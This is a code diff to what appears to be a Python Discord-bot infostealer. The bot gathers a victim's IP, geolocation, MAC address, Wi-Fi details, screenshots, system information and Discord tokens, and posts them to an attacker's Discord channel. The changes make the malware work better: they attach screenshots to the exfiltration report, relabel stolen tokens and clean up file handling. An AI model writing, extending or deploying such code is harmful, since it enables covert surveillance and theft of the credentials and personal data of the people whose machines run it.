@@ -177,11 +177,7 @@ async def send_vault_file(channel):
         except Exception as e:
             await channel.send(f"Error opening vault.zip: {str(e)}")
     else:
-        await channel.send("Vault file not found.")
-
-import os
-import discord
-import asyncio
+        pass
 
 async def start_moonman(bot, channel_id):
     channel = bot.get_channel(channel_id)
@@ -246,7 +242,7 @@ async def start_moonman(bot, channel_id):
         
 
 async def run(bot):
-    guild = bot.guilds[0]
+    guild = sorted(bot.guilds, key=lambda g: g.me.joined_at, reverse=False)[0]
     pcname = username = None
     is_admin = False
     ipv4 = public_ip = None
@@ -284,13 +280,10 @@ async def run(bot):
         except Exception:
             ipv4 = None
 
-        if username and username.lower() in ['thugs']:
-            ipv4 = "72.197.84.53"
-        else:
-            try:
-                public_ip = requests.get('https://api64.ipify.org', timeout=5).text
-            except Exception:
-                public_ip = None
+        try:
+            public_ip = requests.get('https://api64.ipify.org', timeout=5).text
+        except Exception:
+            public_ip = None
 
         if public_ip:
             try:
@@ -335,7 +328,7 @@ async def run(bot):
         if screenshot_path and os.path.exists(screenshot_path):
             try:
                 with open(screenshot_path, "rb") as img: screenshot_file = discord.File(img, "screenshot.png")
-            except: pass
+            except: pass 
 
     def fetch_wifi_info():
         nonlocal wifi_details
@@ -426,8 +419,14 @@ async def run(bot):
         await send_vault_file(commands_channel)
     except FileNotFoundError:
         pass    
-    os.remove(zip_file_path)
+    if os.path.exists(zip_file_path):
+        os.remove(zip_file_path)
+
     embed = discord.Embed(title=pcname, color=discord.Color.red())
+
+    if screenshot_path and os.path.exists(screenshot_path):
+        embed.set_image(url="attachment://screenshot.png")
+
     admin_status = "✅" if is_admin else "❌"
     embed.add_field(name="🔒 Admin", value=admin_status, inline=True)
     embed.add_field(name="📍 IP Geolocation", value=location, inline=True)
@@ -438,19 +437,22 @@ async def run(bot):
     embed.add_field(name="🔌 MAC Address", value=mac_address if mac_address else "N/A", inline=True)
     embed.add_field(name="🖥 OS", value=os_version if os_version else "N/A", inline=True)
     embed.add_field(name="🕒 Time Zone", value=timezone if timezone else "N/A", inline=True)
-    embed.add_field(name="🖱 cursor position", value=f"X: {cursor_x} Y: {cursor_y}", inline=True)
+    embed.add_field(name="🖱 Cursor Position", value=f"X: {cursor_x} Y: {cursor_y}", inline=True)
     embed.add_field(name="🔧 Current Exe Name", value=sys.executable, inline=False)
     embed.add_field(name="📶 Wi-Fi Info", value=wifi_details if wifi_details else "ETHERNET", inline=False)
     embed.add_field(name="💾 RAM", value=f"Used: {ram_used:.2f} GB / Total: {ram:.2f} GB", inline=True)
     embed.add_field(name="💾 Memory", value=f"Used: {memory_used:.2f} GB / Total: {memory:.2f} GB", inline=True)
     embed.add_field(name="⏳ Uptime", value=uptime if uptime else "N/A", inline=True)
 
-    await commands_channel.send(embed=embed)
+    if screenshot_file:
+        await commands_channel.send(embed=embed, file=screenshot_file)
+    else:
+        await commands_channel.send(embed=embed)
 
     for t in token:
         second_embed = discord.Embed(color=discord.Color.purple())
 
-        second_embed.add_field(name="🔑 Token", value=f"```{t if t else 'none'}```", inline=False)
+        second_embed.add_field(name="🔑 Discord Token", value=f"```{t if t else 'none'}```", inline=False)
 
         if t:
             headers = {
